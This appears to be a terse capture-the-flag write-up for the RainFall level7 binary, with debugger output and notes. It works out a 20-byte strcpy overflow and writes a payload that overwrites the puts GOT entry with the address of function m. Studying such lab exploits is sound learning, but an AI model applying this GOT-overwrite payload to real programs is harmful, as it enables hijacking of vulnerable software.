...
Dump of assembler code for function m:
   ...
   0x08048520 <+44>:	ret    
End of assembler dump.
## Looks like need two params for work properly. need to get what to do to make work fopen.
...
level7@RainFall:~$ ltrace ./level7 a b # similar to gdb execute as level7 not level8
...
## May i need to call m() before read from file, i need to change  puts got to point m function.
## for make this i need to write on GOT TABLE.
### I need to access the where is save it
...
###  and the value that i want to change with
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
0x080484f4
#let's use the strcpy to change the address point dst of the second strcpy.
...
## the overflow offset is 20 bytes. address to put 08049928 -> tx little endian -> 28 99 04 08
payload first argument will be "a" * 20 + \x28\x99\04\08
...
## Look like the payload is working fine
level7@RainFall:~$ 
## write on tho got the address of m -> 0x80484f4 -> tx little endian \xf4\x84\x04\x08Do 
because the open fail cause not change suid when ltrace, gdb ... couldn't with ltrace just launched.
